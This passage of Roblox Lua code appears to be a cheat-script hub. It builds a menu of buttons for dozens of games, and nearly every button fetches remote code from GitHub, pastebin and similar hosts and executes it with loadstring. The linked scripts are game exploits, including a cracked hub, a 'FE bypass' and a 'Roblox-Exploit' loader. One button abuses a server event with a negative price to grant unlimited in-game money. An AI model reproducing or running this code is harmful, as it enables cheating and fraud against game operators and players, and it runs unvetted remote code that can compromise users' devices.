    vu1:Notification("Notification", "thaibao Activated", "Okay!")
end)
v35:Button("Enable Hub", function()
    loadstring(game:HttpGet("https://shz.al/~wetvwat"))()
    vu1:Notification("Notification", "Hub Activated", "Okay!")
end)
v35:Button("Enable iSPLOIT", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/b9natwo/iSPLOIT/main/Murderers%20VS%20Sheriffs%20Duels.lua"))()
    vu1:Notification("Notification", "iSPLOIT Activated", "Okay!")
end)
local v36 = v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162  Lumber Tycoon 2")
v36:Button("Enable Butterisgood", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Butterisgood/Butter/main/Root2.lua"))("")
    vu1:Notification("Notification", "Butterisgood Activated", "Okay!")
end)
v36:Button("Enable darkx", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/darkxwin/darkxsourcethinkyoutousedarkx/main/darkx"))()
    vu1:Notification("Notification", "darkx Activated", "Okay!")
end)
v36:Button("Enable Butterisgood", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Butterisgood/Butter/main/Root2.lua"))("")
    vu1:Notification("Notification", "Butterisgood Activated", "Okay!")
end)
v4:Channel("\239\191\189\239\191\189 \226\128\162  Liberty County"):Button("Enable Argon-Hub-V6", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/mcletshacks/Argon-Hub-V6/main/Main.lua", true))()
    vu1:Notification("Notification", "Argon-Hub-V6 Activated", "Okay!")
end)
local v37 = v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 Build a boat for Treasure")
v37:Button("Enable NooVster", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/NooVster/v1.1/main/Source"))()
    vu1:Notification("Notification", "NooVster Activated", "Okay!")
end)
v37:Button("Enable XRoLLu", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/XRoLLu/UWU/main/BUILD%20A%20BOAT%20FOR%20TREASURE.lua"))()
    vu1:Notification("Notification", "XRoLLu Activated", "Okay!")
end)
v37:Button("Enable Virtual Hub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/DomainXV3/Milk-up/main/build.lua", true))()
    vu1:Notification("Notification", "Virtual Hub Activated", "Okay!")
end)
v37:Button("Enable Phantom Hub", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/Erp5dMPH", true))()
    vu1:Notification("Notification", "Phantom Hub Activated", "Okay!")
end)
v37:Button("Enable xQuartyx", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/xQuartyx/DonateMe/main/ScriptLoader"))()
    vu1:Notification("Notification", "xQuartyx Activated", "Okay!")
end)
v37:Button("Enable ZeeroxHub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/RunDTM/ZeeroxHub/main/Loader.lua"))()
    vu1:Notification("Notification", "ZeeroxHub Activated", "Okay!")
end)
v37:Button("Enable BBHscript", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/catblox1346/BBHscript/main/owo"))("More scripts: t.me/arceusxscripts")
    vu1:Notification("Notification", "BBHscript Activated", "Okay!")
end)
v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 Bladers"):Button("Enable FallAngelHub", function()
    getgenv().keysystem = false
    loadstring(game:HttpGet("https://raw.githubusercontent.com/x3fall3nangel/FallAngelHub/main/Main.lua"))()
    vu1:Notification("Notification", "FallAngelHub Activated", "Okay!")
end)
v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 Midnight Chasers"):Button("Enable Midnight", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/scripthubekitten/MIDNIGHTCHASERS/main/MIDNIGHTCHASERS2", true))()
    vu1:Notification("Notification", "Midnight Activated", "Okay!")
end)
v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 Work At a Pizza Place"):Button("Enable Work At a Pizza Place", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/n5BBGHwd"))()
    vu1:Notification("Notification", "Work At a Pizza Place Activated", "Okay!")
end)
local v38 = v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 Strucid")
v38:Button("Enable Apollo", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/10x00/Public-Cracks/main/Apollo%20Hub%20Crack.lua"))()
    vu1:Notification("Notification", "Apollo Activated", "Okay!")
end)
v38:Button("Enable Blue-Box", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/scripthubekitten/bluebox/main/bluebox", true))()
    vu1:Notification("Notification", "Blue-Box Activated", "Okay!")
end)
v38:Button("Enable unfairJhUB", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/rblxscriptsnet/unfair/main/rblxhub.lua", true))()
    vu1:Notification("Notification", "unfairHub Activated", "Okay!")
end)
local v39 = v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 Prison-life")
v39:Button("Enable TigerAdmin", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ScriptQP/TigerAdmin/main/PrisonLife", true))()
    vu1:Notification("Notification", "TIGERADMINSCRIPTFREE Activated", "Okay!")
end)
v39:Button("Enable ArDrakHubPrisonlife", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Hungtu2121/Mygame/main/ArDrakHubPrisonlife"))("t.me/arceusxscripts")
    vu1:Notification("Notification", "ArDrakHubPrisonlife Activated", "Okay!")
end)
v39:Button("Enable Tbao hub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/tbao143/thaibao/main/TbaohubPrisonLife"))()
    vu1:Notification("Notification", "Tbao hub Activated", "Okay!")
end)
v39:Button("Enable Fe Bypass Gui 2024", function()
    loadstring("loadstring(game:HttpGet(\"https://raw.githubusercontent.com/g00lXploiter/g00lXploiter/main/Fe%20bypass\", true))()\n")()
    vu1:Notification("Notification", "Fe Bypass Gui 2024 Activated", "Okay!")
end)
v39:Button("Enable PRISONWARE", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Denverrz/scripts/master/PRISONWARE_v1.3.txt"))()
    vu1:Notification("Notification", "PRISONWARE Activated", "Okay!")
end)
v39:Button("Enable QP-Community", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/QP-Community/Roblox-Exploit/main/Loader.lua"))()
    vu1:Notification("Notification", "QP-Community Activated", "Okay!")
end)
v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 big-paintball"):Button("Enable OwlHub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/CriShoux/OwlHub/master/OwlHub.txt", true))()
    vu1:Notification("Notification", "OwlHub Activated", "Okay!")
end)
v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 Grimoires-era"):Button("Enable OMGHUB", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Omgshit/Scripts/main/MainLoader.lua"))()
    vu1:Notification("Notification", "OMGHUB Activated", "Okay!")
end)
v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 my restaurant"):Button("Enable SpencerDevv", function()
    loadstring(game:HttpGet("https://gist.githubusercontent.com/SpencerDevv/33683ac31b7e2621b90b9a3b39a3155c/raw/9d4fd60202457cacb17871e5d18b3654bdd344e6/betaV8"))()
    vu1:Notification("Notification", "SpencerDevv Activated", "Okay!")
end)
v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 Death-Ball"):Button("Enable LOLking123456", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/LOLking123456/Death/main/Ball"))()
    vu1:Notification("Notification", "LOLking123456 Activated", "Okay!")
end)
local v40 = v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 anime-last-stand")
v40:Button("Enable Legend Handles Hub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/LOLking123456/AnimeLast/main/Stand"))()
    vu1:Notification("Notification", "Legend Handles Hub Activated", "Okay!")
end)
v40:Button("Enable buanghub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/buang5516/buanghub/main/animeLastStand.lua"))()
    vu1:Notification("Notification", "buanghub Activated", "Okay!")
end)
local v41 = v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 Legends of speed")
v41:Button("Enable SuPray", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/LiverMods/SuPray/main/Speed-of-Legends.lua", true))()
    vu1:Notification("Notification", "SuPray Activated", "Okay!")
end)
v41:Button("Enable The Legends Hub", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/mqGPg69N"))()
    vu1:Notification("Notification", "The Legends Hub Activated", "Okay!")
end)
v41:Button("Enable Legends of speed", function()
    loadstring(game:HttpGet("https://freenote.biz/raw/i9imrx7nls"))()
    vu1:Notification("Notification", "Legends of speed Activated", "Okay!")
end)
v41:Button("Enable TbaoHub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/tbao143/thaibao/main/TbaoHublegendsofspeed"))()
    vu1:Notification("Notification", "TbaoHub Activated", "Okay!")
end)
v41:Button("Enable LOS HUB", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/SkoterScripts/Legends-Of-Speed-Script/main/Script%20For%20Legends%20Of%20Speed.txt"))()
    vu1:Notification("Notification", "LOS HUB Activated", "Okay!")
end)
v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 pop-it-trading"):Button("Enable XDKENTRYANBORBON", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/De3sBbAM"))()
    vu1:Notification("Notification", "pop-it-trading Activated", "Okay!")
end)
v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 Block-Mayhem"):Button("Enable AutoFarm", function()
    loadstring(game:HttpGet("https://scriptblox.com/raw/5X-Block-Mayhem-Auto-farm-updated-13550"))()
    vu1:Notification("Notification", "AutoFarm Activated", "Okay!")
end)
local v42 = v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 Flee The Facility")
v42:Button("Enable K9ntra", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/K9ntra/EVA/main/abc.lua"))()
    vu1:Notification("Notification", "K9ntra Activated", "Okay!")
end)
v42:Button("Enable infinity hub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/antisocialb2/SPIMINE-FLEETHEFACILITY/main/script.lua"))()
    vu1:Notification("Notification", "infinity hub Activated", "Okay!")
end)
v42:Button("Enable FF HUB", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/1GEWA6th"))()
    vu1:Notification("Notification", "FF HUB Activated", "Okay!")
end)
v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 JailBird"):Button("Enable Horizon.cc", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Zypher32/Horizon.cc/main/loader"))()
    vu1:Notification("Notification", "Horizon.cc Activated", "Okay!")
end)
local v43 = v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 Counter-Blox")
v43:Button("Enable AirHub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Exunys/AirHub/main/AirHub.lua"))()
    vu1:Notification("Notification", "AirHub Activated", "Okay!")
end)
v43:Button("Enable midnight.cc", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/laeraz/midnightcc/main/public.lua"))()
    vu1:Notification("Notification", "midnight.cc Activated", "Okay!")
end)
v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 Phantom forces"):Button("Enable DeleteMobV2", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Mick-gordon/Hyper-Escape/main/DeleteMobV2.lua", true))()
    vu1:Notification("Notification", "DeleteMobV2 Activated", "Okay!")
end)
local v44 = v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 Driving Empire")
v44:Button("Enable DrivingEmpireEvents", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/cool83birdcarfly02six/DrivingEmpireEvents/main/README.md", true))()
    vu1:Notification("Notification", "DrivingEmpireEvents", "Okay!")
end)
v44:Button("Enable Qrto1", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Qrto1/working/main/pc"))()
    vu1:Notification("Notification", "Qrto1 Activated", "Okay!")
end)
v44:Button("Enable Driving Empire", function()
    loadstring(game:HttpGet("https://scriptblox.com/raw/CLASSIC-Driving-Empire-Car-Racing-Tix-Esp-And-More-13303"))()
    vu1:Notification("Notification", "Driving Empire Activated", "Okay!")
end)
local v45 = v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 SOLS-RNG")
v45:Button("Enable Legend Handles Hub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/LOLking123456/RNG/main/Sol"))()
    vu1:Notification("Notification", "Legend Handles Hub Activated", "Okay!")
end)
v45:Button("Enable Looser3itx", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Looser3itx/Hmmmmmmmmmmmmmmmmmmmmmmmmmmmm/main/loader.lua"))()
    vu1:Notification("Notification", "Looser3itx Activated", "Okay!")
end)
v45:Button("Enable HOHO_H", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/acsu123/HOHO_H/main/Loading_UI"))()
    vu1:Notification("Notification", "HOHO_H Activated", "Okay!")
end)
v45:Button("Enable Just3itx", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Just3itx/Backup/main/loader.lua"))()
    vu1:Notification("Notification", "Just3itx Activated", "Okay!")
end)
local v46 = v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 GYM LEAGUE")
v46:Button("Enable AhmadV99", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Script-Games/main/Gym%20League.lua"))()
    vu1:Notification("Notification", "AhmadV99 Activated", "Okay!")
end)
v46:Button("Enable Demonic-HUB", function()
    getgenv().ValidateType = "Key"
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Prosexy/Demonic-HUB-V2/main/DemonicHub_V2.lua", true))()
    vu1:Notification("Notification", "Demonic-HUB Activated", "Okay!")
end)
v46:Button("Enable ryk", function()
    loadstring(game:HttpGet("https://ryk.bloxteam.com/loader.lua"))()
    vu1:Notification("Notification", "ryk Activated", "Okay!")
end)
v46:Button("Enable AtherHub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Athergaming/Roblox-Gym-League-Script/main/AtherHub%20Gym%20League%20V1_5.lua"))()
    vu1:Notification("Notification", "AtherHub Activated", "Okay!")
end)
local v47 = v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 Muscle-Legends")
v47:Button("Enable ahmadsgamer2", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ahmadsgamer2/Script--Game/main/Muscle-Legends", true))()
    vu1:Notification("Notification", "ahmadsgamer2 Activated", "Okay!")
end)
v47:Button("Enable ProjectV1", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ProjectV1ontop/ProjectV1/main/Free%20Version"))()
    vu1:Notification("Notification", "ProjectV1 Activated", "Okay!")
end)
v47:Button("Enable StupidProAArsenal", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/StupidProAArsenal/main/main/Musclas%20Legenos.lua"))()
    vu1:Notification("Notification", "StupidProAArsenal Activated", "Okay!")
end)
local v48 = v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 The-Strongest-Battleground")
v48:Button("Enable Lightux Hub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/zeuise0002/SSSWWW222/main/README.md", true))()
    vu1:Notification("Notification", "Lightux Hub Activated", "Okay!")
end)
v48:Button("Enable Neutron", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/PawsThePaw/Neutron.lua/main/MainNeutron.lua"))()
    vu1:Notification("Notification", "Neutron Activated", "Okay!")
end)
v48:Button("Enable auto-combo", function()
    loadstring(game:HttpGet("https://rentry.org/auto-combo/raw"))()
    vu1:Notification("Notification", "auto-combo Activated", "Okay!")
end)
v48:Button("Enable LOLking123456", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/LOLking123456/KJ/main/TSB"))()
    vu1:Notification("Notification", "LOLking123456 Activated", "Okay!")
end)
v48:Button("Enable JH NN GAMING", function()
    loadstring(game:HttpGet("https://freenote.biz/raw/xkcdkgyhkx", true))()
    vu1:Notification("Notification", "JH NN GAMING Activated", "Okay!")
end)
v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 Strongman Simulator"):Button("Enable itsnoctural", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/itsnoctural/Destiny/main/loader.lua", true))()
    vu1:Notification("Notification", "itsnoctural Activated", "Okay!")
end)
v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\226\128\162 Car Dealership Tycoon"):Button("Enable Marco8642", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Marco8642/science/main/car%20dealer", true))()
    vu1:Notification("Notification", "Marco8642 Activated", "Okay!")
end)
v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\226\128\162 Emergency Hamburg"):Button("Enable Emergency Hamburg", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/zCDVzN7f"))()
    vu1:Notification("Notification", "Emergency Hamburg Activated", "Okay!")
end)
v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\226\128\162 Sneaker Resell"):Button("Enable Sneaker Resell", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Marco8642/science/ok/sneaker%20script", true))()
    vu1:Notification("Notification", "Sneaker Resell Activated", "Okay!")
end)
v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\226\128\162Highway Hooligans"):Button("Enable hooligans", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Marco8643/test/main/hooligans", true))()
    vu1:Notification("Notification", "hooligans Activated", "Okay!")
end)
v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\226\128\162 Trucking Empire"):Button("Enable Marco8642", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Marco8642/science/ok/trucking%20empire%20script", true))()
    vu1:Notification("Notification", "Marco8642 Activated", "Okay!")
end)
v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\226\128\162 Dealership Tycoon"):Button("Enable Marco8642", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Marco8642/science/main/dealership%20tycoon"))()
    vu1:Notification("Notification", "Marco8642 Activated", "Okay!")
end)
v4:Channel("\239\191\189\239\191\189\239\184\143\226\128\162 Airplane Simulator"):Button("Enable Marco8642", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Marco8642/science/main/airplane%20script"))()
    vu1:Notification("Notification", "Marco8642 Activated", "Okay!")
end)
v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\226\128\162 Off-Roading Epic"):Button("Enable Marco8642", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Marco8642/science/ok/off%20roading%20script"))()
    vu1:Notification("Notification", "Marco8642 Activated", "Okay!")
end)
v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\226\128\162 Islands"):Button("Enable pascaldercoole1", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/pascaldercoole1/Open-Source-Scripts/main/FreeIslands"))()
    vu1:Notification("Notification", "pascaldercoole1 Activated", "Okay!")
end)
v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\226\128\162 T ang County"):Button("Enable Marco8642", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Marco8642/science/ok/tang%20county%20script", true))()
    vu1:Notification("Notification", "Marco8642 Activated", "Okay!")
end)
v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\226\128\162 Baddies"):Button("Enable Demonic-HUB", function()
    getgenv().ValidateType = "Key"
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Prosexy/Demonic-HUB-V2/main/DemonicHub_V2.lua", true))()
    vu1:Notification("Notification", "Demonic-HUB Activated", "Okay!")
end)
local v49 = v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\226\128\162 Magic RNG")
v49:Button("Enable Demonic-HUB", function()
    getgenv().ValidateType = "Key"
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Prosexy/Demonic-HUB-V2/main/DemonicHub_V2.lua", true))()
    vu1:Notification("Notification", "Demonic-HUB Activated", "Okay!")
end)
v49:Button("Enable BaconBoss", function()
    loadstring(game:HttpGet("https://pastefy.app/4BEvBW3k/raw", true))()
    vu1:Notification("Notification", "BaconBoss Activated", "Okay!")
end)
local v50 = v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\226\128\162 Demonfall")
v50:Button("Enable Demonic-HUB", function()
    getgenv().ValidateType = "Key"
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Prosexy/Demonic-HUB-V2/main/DemonicHub_V2.lua", true))()
    vu1:Notification("Notification", "Demonic-HUB Activated", "Okay!")
end)
v50:Button("Enable Demon-Fall(Solara-Keysyetem)", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/debunked69/Demonfall-Solara/main/Protected_5312497258853096.txt"))()
    vu1:Notification("Notification", "Demon-Fall Activated", "Okay!")
end)
v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\226\128\162 Anime-Dimensions"):Button("Enable Demonic-HUB", function()
    getgenv().ValidateType = "Key"
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Prosexy/Demonic-HUB-V2/main/DemonicHub_V2.lua", true))()
    vu1:Notification("Notification", "Demonic-HUB Activated", "Okay!")
end)
v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\226\128\162 Clover-retribution"):Button("Enable Demonic-HUB", function()
    getgenv().ValidateType = "Key"
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Prosexy/Demonic-HUB-V2/main/DemonicHub_V2.lua", true))()
    vu1:Notification("Notification", "Demonic-HUB Activated", "Okay!")
end)
v4:Channel("\239\191\189\239\191\189\239\184\143\226\128\162 fight in a school"):Button("Enable Demonic-HUB", function()
    getgenv().ValidateType = "Key"
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Prosexy/Demonic-HUB-V2/main/DemonicHub_V2.lua", true))()
    vu1:Notification("Notification", "Demonic-HUB Activated", "Okay!")
end)
local v51 = v4:Channel("\239\191\189\239\191\189\239\184\143\226\128\162 RE:XL")
v51:Button("Enable Demonic-HUB", function()
    getgenv().ValidateType = "Key"
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Prosexy/Demonic-HUB-V2/main/DemonicHub_V2.lua", true))()
    vu1:Notification("Notification", "Demonic-HUB Activated", "Okay!")
end)
v51:Button("Enable NukeVsCity", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/NukeVsCity/Scripts2024/main/projxlrexl"))()
    vu1:Notification("Notification", "NukeVsCity Activated", "Okay!")
end)
v4:Channel("\239\191\189\239\191\189\239\184\143\226\128\162 Admin RNG"):Button("Enable Demonic-HUB", function()
    getgenv().ValidateType = "Key"
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Prosexy/Demonic-HUB-V2/main/DemonicHub_V2.lua", true))()
    vu1:Notification("Notification", "Demonic-HUB Activated", "Okay!")
end)
local v52 = v4:Channel("\239\191\189\239\191\189\239\184\143\226\128\162 Type Soul")
v52:Button("Enable Skeereddo", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Skeereddo/name/main/krnl", true))()
    vu1:Notification("Notification", "Skeereddo Activated", "Okay!")
end)
v52:Button("Enable Reaper-Hub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/AyoReaper/Reaper-Hub/main/loader.lua"))()
    vu1:Notification("Notification", "Reaper-Hub Activated", "Okay!")
end)
v52:Button("Enable LOLking123456", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/LOLking123456/newtype/main/soul"))()
    vu1:Notification("Notification", "LOLking123456 Activated", "Okay!")
end)
v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\226\128\162 Toilet Tower Defense"):Button("Enable ReaperScripts", function()
    loadstring(http.request({
        Url = "https://reaperscripts.com/loader?l=1"
    }).Body, "0zek8y2bld7.qowl6c7o~1")()
    vu1:Notification("Notification", "ReaperScripts Activated", "Okay!")
end)
v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\226\128\162 Toilet Tower Defense MODDED"):Button("Enable ToraScript", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ToraScript/Script/main/ToiletTowerModded", true))()
    vu1:Notification("Notification", "ToraScript Activated", "Okay!")
end)
v4:Channel("\239\191\189\239\191\189\239\184\143\226\128\162 Untitled Boxing"):Button("Enable Visualz", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Nyaha3222/Visualz/main/Untitled/Boxing%20/Game/Script"))()
    vu1:Notification("Notification", "Visualz Activated", "Okay!")
end)
v4:Channel("\239\191\189\239\191\189\239\184\143\226\128\162 Untitled-Tag-Game"):Button("Enable cathub", function()
    loadstring(game:HttpGet("https://whimper.xyz/cathub.lua"))()
    vu1:Notification("Notification", "cathub Activated", "Okay!")
end)
v4:Channel("\239\191\189\239\191\189\239\184\143\226\128\162 One Piece Game"):Button("Enable Demonic-HUB", function()
    getgenv().ValidateType = "Key"
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Prosexy/Demonic-HUB-V2/main/DemonicHub_V2.lua", true))()
    vu1:Notification("Notification", "Demonic-HUB Activated", "Okay!")
end)
local v53 = v4:Channel("\239\191\189\239\191\189\239\184\143\226\128\162 Dungeon Quest")
v53:Button("Enable Demonic-HUB", function()
    getgenv().ValidateType = "Key"
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Prosexy/Demonic-HUB-V2/main/DemonicHub_V2.lua", true))()
    vu1:Notification("Notification", "Demonic-HUB Activated", "Okay!")
end)
v53:Button("Enable NS-HUB", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/OhhMyGehlee/Best/main/Dungeon"))()
    vu1:Notification("Notification", "NS-HUB Activated", "Okay!")
end)
v4:Channel("\239\191\189\239\191\189\239\184\143\226\128\162 Monster Ghoul"):Button("Enable Demonic-HUB", function()
    getgenv().ValidateType = "Key"
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Prosexy/Demonic-HUB-V2/main/DemonicHub_V2.lua", true))()
    vu1:Notification("Notification", "Demonic-HUB Activated", "Okay!")
end)
v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 Fishing Simulator"):Button("Enable Demonic-HUB", function()
    getgenv().ValidateType = "Key"
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Prosexy/Demonic-HUB-V2/main/DemonicHub_V2.lua", true))()
    vu1:Notification("Notification", "Demonic-HUB Activated", "Okay!")
end)
v4:Channel("\239\191\189\239\191\189\239\184\143\226\128\162 Super Power Fighting Simulator"):Button("Enable Super Power", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/scripthubekitten/SuperPowerFightingSimulator/main/Simulator", true))()
    vu1:Notification("Notification", "Super Power Activated", "Okay!")
end)
v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 Happy Land RP"):Button("Enable INF MONEY", function()
    game:GetService("ReplicatedStorage").Events.BuyEggEvent:FireServer("RandomEgg", - 1000000000)
    vu1:Notification("Notification", "INF MONEY Activated", "Okay!")
end)
v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 SCP: Roleplay"):Button("Enable KeoneGithub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/KeoneGithub/KeoneGithub/main/FreeLeanSCP", true))()
    vu1:Notification("Notification", "KeoneGithub Activated", "Okay!")
end)
v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 Zombie Uprising"):Button("Enable Unknown-Hub-X", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Unknownproooolucky/Unknown-Hub-X-Universal-Games/main/Games/Zombie-Uprising"))()
    vu1:Notification("Notification", "Unknown-Hub-X Activated", "Okay!")
end)
v4:Channel("\239\191\189\239\191\189\239\184\143 \226\128\162 Build bunker to survive"):Button("Enable ToraScript", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ToraScript/Script/main/Buildabunker", true))()
    vu1:Notification("Notification", "ToraScript Activated", "Okay!")
end)
v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 raiseafloppa 2"):Button("Enable ToraScript", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ToraScript/Script/main/RaiseaFloppa2", true))()
    vu1:Notification("Notification", "ToraScript Activated", "Okay!")
end)
v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162  Sword Training Simulator"):Button("Enable sword training simulator", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/0e9Mk0uY"))()
    vu1:Notification("Notification", "sword training simulator Activated", "Okay!")
end)
v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 Anime Champions Simulator"):Button("Enable Banana Hub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/diepedyt/bui/main/temporynewkeysystem.lua"))()
    vu1:Notification("Notification", "Banana Hub Activated", "Okay!")
end)
